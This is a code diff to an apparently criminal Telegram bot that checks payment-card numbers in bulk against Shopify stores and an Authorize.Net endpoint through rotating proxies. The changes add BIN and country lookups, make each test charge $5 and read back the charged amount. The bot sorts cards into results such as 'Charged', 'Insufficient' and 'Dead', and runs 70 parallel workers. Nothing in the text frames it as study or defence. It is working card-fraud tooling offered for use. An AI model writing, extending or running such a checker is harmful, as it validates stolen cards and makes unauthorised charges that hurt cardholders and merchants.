@@ -91,7 +91,7 @@ AUTHNET_API_URL = 'https://authnet-4b3p.vercel.app/calc'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
-# التعديلات المطلوبة (تم تقليل الـ Workers إلى 20 لضمان استقرار سيرفر الاستضافة وتجنب الـ Rate Limit)
+# التعديلات المطلوبة
 WORKERS = 70  
 DELAY = 5.0  
 HIT_DELAY = 1.0
@@ -190,11 +190,32 @@ CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>'
 CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
 CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">💥</tg-emoji>'
 
-# ====================== BULLETPROOF CONFIGS ======================
+# ====================== BULLETPROOF CONFIGS & FLAG TRANSLATIONS ======================
+ISO3_TO_ISO2 = {
+    "USA": "US", "GBR": "GB", "CAN": "CA", "AUS": "AU", "DEU": "DE", "FRA": "FR",
+    "ITA": "IT", "ESP": "ES", "BRA": "BR", "IND": "IN", "CHN": "CN", "JPN": "JP",
+    "RUS": "RU", "ZAF": "ZA", "MEX": "MX", "SGP": "SG", "TUR": "TR", "SAU": "SA",
+    "ARE": "AE", "KWT": "KW", "QAT": "QA", "OMN": "OM", "BHR": "BH", "EGY": "EG"
+}
+
+COUNTRY_NAME_TO_CODE = {
+    "UNITED STATES": "US", "UNITED KINGDOM": "GB", "CANADA": "CA", "AUSTRALIA": "AU",
+    "GERMANY": "DE", "FRANCE": "FR", "ITALY": "IT", "SPAIN": "ES", "BRAZIL": "BR",
+    "INDIA": "IN", "CHINA": "CN", "JAPAN": "JP", "RUSSIA": "RU", "SOUTH AFRICA": "ZA",
+    "MEXICO": "MX", "SINGAPORE": "SG", "TURKEY": "TR", "SAUDI ARABIA": "SA",
+    "UNITED ARAB EMIRATES": "AE", "KUWAIT": "KW", "QATAR": "QA", "OMAN": "OM",
+    "BAHRAIN": "BH", "EGYPT": "EG", "JORDAN": "JO", "LEBANON": "LB", "PALESTINE": "PS",
+    "IRAQ": "IQ", "YEMEN": "YE", "ALGERIA": "DZ", "MOROCCO": "MA", "TUNISIA": "TN",
+    "LIBYA": "LY", "SUDAN": "SD", "SYRIA": "SY"
+}
+
 def get_flag_emoji(country_code, fallback="🏳️"):
-    if not country_code or len(country_code) != 2: return fallback
-    c = country_code.upper()
+    if not country_code: return fallback
+    c = str(country_code).upper().strip()
+    if len(c) == 3:
+        c = ISO3_TO_ISO2.get(c, c[:2])
     if c in ["-", "UNKNOWN", ""]: return fallback
+    if len(c) != 2: return fallback
     try:
         return chr(ord(c[0]) + 127397) + chr(ord(c[1]) + 127397)
     except Exception:
@@ -519,6 +540,33 @@ async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
     return False
 
+# ====================== CLEANING AND SANITIZING BIN DETAILS ======================
+def clean_bin_data(data):
+    country_name = str(data.get("country", "-")).upper().strip()
+    country_code = str(data.get("country_code", data.get("country_iso", data.get("code", "")))).upper().strip()
+    
+    # محاولة مطابقة كود الدولة إذا كان الاسم متاحاً فقط
+    if not country_code and country_name != "-":
+        country_code = COUNTRY_NAME_TO_CODE.get(country_name, "")
+        
+    # تحويل الأكواد الثلاثية (مثل USA) إلى ثنائية (US) ليعمل العلم بشكل سليم
+    if len(country_code) == 3:
+        country_code = ISO3_TO_ISO2.get(country_code, country_code[:2])
+        
+    flag = data.get("flag", "")
+    if not flag or str(flag).strip() in ["", "🏳️", "-"]:
+        flag = get_flag_emoji(country_code)
+        
+    return {
+        "brand": str(data.get("brand", "-")).upper().strip(),
+        "type": str(data.get("type", "-")).upper().strip(),
+        "level": str(data.get("level", "-")).upper().strip(),
+        "bank": str(data.get("bank", "-")).upper().strip(),
+        "country": country_name,
+        "country_code": country_code,
+        "flag": flag
+    }
+
 async def get_bin_info(bin_code, session=None):
     b6 = str(bin_code)[:6]
     if b6 in _BIN_CACHE: 
@@ -534,20 +582,20 @@ async def get_bin_info(bin_code, session=None):
             async with s.get(url1, headers=headers, timeout=4) as r:
                 if r.status == 200:
                     data = await r.json()
-                    if data and isinstance(data, dict) and data.get('brand'): return data
+                    if data and isinstance(data, dict): return data
                 return None
         
         res = await fetch1(session) if (session and not session.closed) else await fetch1(aiohttp.ClientSession())
         if res:
-            parsed = {
-                "brand": str(res.get("brand", "-")).upper(),
-                "type": str(res.get("type", "-")).upper(),
-                "level": str(res.get("level", "-")).upper(),
-                "bank": str(res.get("bank", "-")).upper(),
-                "country": str(res.get("country", "-")).upper(),
-                "country_code": str(res.get("country_code", "")).upper().strip(),
+            parsed = clean_bin_data({
+                "brand": res.get("brand", "-"),
+                "type": res.get("type", "-"),
+                "level": res.get("level", "-"),
+                "bank": res.get("bank", "-"),
+                "country": res.get("country", "-"),
+                "country_code": res.get("country_code") or res.get("country_iso") or res.get("code") or "",
                 "flag": res.get("flag", "")
-            }
+            })
             _BIN_CACHE[b6] = parsed
             return parsed
     except Exception: pass
@@ -563,21 +611,22 @@ async def get_bin_info(bin_code, session=None):
         if res2 and res2.get("Status") == "SUCCESS":
             country_obj = res2.get("Country", {})
             bank_obj = res2.get("Bank", {})
-            parsed = {
-                "brand": str(res2.get("Scheme", "-")).upper(),
-                "type": str(res2.get("Type", "-")).upper(),
-                "level": str(res2.get("CardTier", "-")).upper(),
-                "bank": str(bank_obj.get("Name", "-")).upper(),
-                "country": str(country_obj.get("Name", "-")).upper(),
-                "country_code": str(country_obj.get("A2", "")).upper().strip(),
+            parsed = clean_bin_data({
+                "brand": res2.get("Scheme", "-"),
+                "type": res2.get("Type", "-"),
+                "level": res2.get("CardTier", "-"),
+                "bank": bank_obj.get("Name", "-"),
+                "country": country_obj.get("Name", "-"),
+                "country_code": country_obj.get("A2", "") or country_obj.get("A3", ""),
                 "flag": ""
-            }
+            })
             _BIN_CACHE[b6] = parsed
             return parsed
     except Exception: pass
 
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
+# ====================== SHOPIFY GATEWAY ENGINE (UPDATED FOR DYNAMIC PRICE & $5 LIMIT) ======================
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
@@ -592,7 +641,9 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         site_encoded = quote(site_param)
         
         proxy_param = f"&proxy={quote(proxy_str)}" if proxy_str else "&proxy="
-        req_url = f"{api_url}?cc={card_encoded}&site={site_encoded}{proxy_param}"
+        
+        # تمرير قيم amount و amt و price محددة بـ 5 دولارات لتجنب سحب مبالغ كبيرة
+        req_url = f"{api_url}?cc={card_encoded}&site={site_encoded}{proxy_param}&amount=5&amt=5&price=5"
         
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
@@ -601,22 +652,32 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         async with session.get(req_url, headers=headers, timeout=API_TIMEOUT) as resp:
             text_data = await resp.text()
             
+            # محاولة قراءة استجابة السعر ديناميكيًا من الـ JSON أو الـ Regex
+            pr = None
             try: 
                 rj = json.loads(text_data)
                 rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', '')))))))).strip()
-                pr = rj.get('Price', rj.get('amount', "$10.00")) 
                 gt = rj.get('Gateway', 'Shopify')
+                
+                # البحث الذكي عن مفتاح السعر
+                for k in ['Price', 'price', 'amount', 'Amount', 'amt', 'Amt', 'charged']:
+                    if k in rj and rj[k]:
+                        pr = str(rj[k]).strip()
+                        break
             except Exception: 
                 rm = text_data.strip()
-                pr = "$10.00"
                 gt = "Shopify"
+            
+            # إذا لم نجد مفتاحاً صريحاً في الـ JSON، نستخلص السعر ديناميكياً من النص عبر الـ Regex
+            if not pr:
+                price_match = re.search(r'\$\d+(?:\.\d{2})?', text_data)
+                pr = price_match.group(0) if price_match else "$5.00" # الاحتياطي هو 5 دولار التي طلبناها
             
             rl = rm.lower()
             
             if any(k in rl for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
-            # تم حذف كلمة 'error' و 'session' لتجنب فرز الـ Decline الطبيعي للبطاقات كخطأ موقع
             if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare', '502', '503', '504']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
                 
@@ -639,13 +700,14 @@ async def check_shopify_api(api_url, card, site, proxy, session):
     except Exception as e: 
         return {'status': 'Site Error', 'message': f'API Error: {str(e)[:30]}', 'card': card, 'retry': True}
 
-# ====================== ASYNC AUTHNET GATEWAY ENGINE ======================
+# ====================== ASYNC AUTHNET GATEWAY ENGINE (UPDATED FOR DYNAMIC PRICE & $5 LIMIT) ======================
 async def check_authnet_api(card, proxy, session):
     try:
         proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         card = card.strip()
         
-        req_url = f"{AUTHNET_API_URL}?cc={quote(card)}"
+        # تمرير قيم السعر لتجربة سحب 5 دولارات فقط
+        req_url = f"{AUTHNET_API_URL}?cc={quote(card)}&amount=5&amt=5&price=5"
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         }
@@ -653,35 +715,46 @@ async def check_authnet_api(card, proxy, session):
         async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as resp:
             text_data = await resp.text()
             
+            pr = None
             try:
                 rj = json.loads(text_data)
                 rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', text_data)))))))).strip()
+                
+                # البحث الذكي عن مفتاح السعر
+                for k in ['Price', 'price', 'amount', 'Amount', 'amt', 'Amt', 'charged']:
+                    if k in rj and rj[k]:
+                        pr = str(rj[k]).strip()
+                        break
             except Exception:
                 rm = text_data.strip()
+                
+            if not pr:
+                price_match = re.search(r'\$\d+(?:\.\d{2})?', text_data)
+                pr = price_match.group(0) if price_match else "$5.00"
                 
             rl = rm.lower()
             
             if any(k in rl for k in ['this transaction has been approved', 'charged', 'success', 'payment succeeded', 'completed']):
-                return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
+                return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                 
             if any(k in rl for k in ['insufficient funds', 'insufficient_funds', 'funds', 'balance']):
-                return {'status': 'Insufficient', 'message': 'Insufficient Funds', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
+                return {'status': 'Insufficient', 'message': 'Insufficient Funds', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                 
             if any(k in rl for k in ['authentication_required', '3d', 'secure', 'verification', 'otp', 'held for review', 'review']):
-                return {'status': 'Approved', 'message': '3D Secure Required', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
+                return {'status': 'Approved', 'message': '3D Secure Required', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                 
             if any(k in rl for k in ['the transaction was declined', 'declined', 'card declined', 'do not honor', 'stolen', 'lost', 'expired', 'invalid number', 'suspected fraud', 'card code is invalid']):
-                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
+                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                 
             if any(k in rl for k in ['error', 'timeout', 'proxy', 'bad gateway', 'cloudflare', 'system unavailable']):
-                return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00', 'retry': True}
+                return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr, 'retry': True}
                 
-            return {'status': 'Dead', 'message': rm if rm else 'Transaction Declined', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
+            return {'status': 'Dead', 'message': rm if rm else 'Transaction Declined', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
             
     except asyncio.TimeoutError:
-        return {'status': 'Site Error', 'message': 'AuthNet API Timeout', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00', 'retry': True}
+        return {'status': 'Site Error', 'message': 'AuthNet API Timeout', 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00', 'retry': True}
     except Exception as e:
-        return {'status': 'Site Error', 'message': f'AuthNet API Error: {str(e)[:40]}', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00', 'retry': True}
+        return {'status': 'Site Error', 'message': f'AuthNet API Error: {str(e)[:40]}', 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00', 'retry': True}
 
 async def remove_proxy_by_url(uid, proxy_url):
     try:
@@ -731,7 +804,7 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
             
             if any(k in msg for k in ['proxy', 'tunnel', 'connection close', 'format error', 'max retries', 'bad gateway', 'timeout']):
                 if p_dict and p_dict in proxies:
-                    proxies.remove(p_dict)  # يتم حذفه من جلسة الفحص الحالية لتجنب البطء، ولكن لا يتم حذفه نهائياً من قاعدة البيانات لتجنب نفاد البروكسيات فجأة
+                    proxies.remove(p_dict)  
                 lr = r
                 continue
 
